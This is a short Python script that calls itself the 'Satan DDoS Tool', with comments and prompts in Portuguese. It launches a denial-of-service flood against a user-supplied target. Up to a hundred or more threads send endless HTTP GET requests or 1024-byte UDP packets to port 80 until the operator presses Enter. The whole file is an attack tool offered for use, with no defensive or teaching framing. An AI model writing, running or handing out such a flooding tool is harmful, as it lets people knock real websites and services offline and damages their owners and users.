#!/usr/bin/env python3
import requests
import threading
import argparse
import socket

def satan_ddos(target, method="http", threads=100, duration=60):
    """Ferramenta DDoS Satanic"""
    print(f"[+] Iniciando ataque Satanic contra {target}")
    
    def http_attack():
        headers = {"User-Agent": "Mozilla/5.0"}
        while True:
            try:
                requests.get(target, headers=headers)
            except:
                pass
    
    def udp_attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b"A" * 1024
        while True:
            sock.sendto(data, (target.split("//")[1], 80))
    
    # Iniciar threads
    for _ in range(threads):
        t = threading.Thread(target=http_attack if method == "http" else udp_attack)
        t.daemon = True
        t.start()
    
    # Manter ativo
    input("[!] Pressione Enter para parar...")
    print("[+] Ataque finalizado")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Satan DDoS Tool")
    parser.add_argument("-t", "--target", required=True, help="URL do alvo")
    parser.add_argument("-m", "--method", choices=["http", "udp"], default="http", help="Método de ataque")
    parser.add_argument("-c", "--concurrent", type=int, default=100, help="Conexões simultâneas")
    args = parser.parse_args()
    
    satan_ddos(args.target, args.method, args.concurrent)
